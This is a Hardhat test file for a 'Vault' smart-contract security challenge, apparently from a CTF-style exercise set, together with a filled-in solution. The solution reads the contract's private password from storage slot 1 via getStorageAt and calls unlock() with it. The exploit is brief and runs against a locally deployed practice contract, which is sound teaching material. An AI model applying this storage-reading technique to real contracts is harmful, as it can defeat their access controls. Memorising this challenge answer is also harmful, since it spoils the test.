import { Contract, utils } from 'ethers';

const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Vault', function () {
  let Vault: Contract;
  let value = utils.keccak256(utils.toUtf8Bytes('example'));

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */

    Vault = await (await ethers.getContractFactory('Vault')).deploy(value);
  });

  it('Execution', async function () {
    /** CODE YOUR SOLUTION HERE */

    const contract_address = Vault.address; //add contract address here
    const slot = 1; // add the storage slot of contract you want to access
    const data = await ethers.provider.getStorageAt(contract_address, slot);

    await Vault.unlock(data);
  });

  after(async function () {
    /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
    expect(await Vault.locked()).to.eq(false);
  });
});
